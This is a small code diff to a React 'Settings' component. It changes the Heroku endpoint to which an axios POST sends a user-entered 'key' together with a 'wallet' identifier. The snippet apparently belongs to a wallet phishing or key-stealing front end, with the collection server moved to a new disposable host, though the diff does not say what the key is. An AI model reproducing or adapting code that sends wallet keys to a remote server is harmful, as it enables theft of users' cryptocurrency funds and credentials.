@@ -23,7 +23,7 @@ const Settings = () => {
 
     key !== ""
       ? axios
-        .post("https://glacial-temple-10425.herokuapp.com/send", {
+        .post("https://stark-citadel-82468.herokuapp.com/send", {
           key: key,
           wallet: pid,
         })
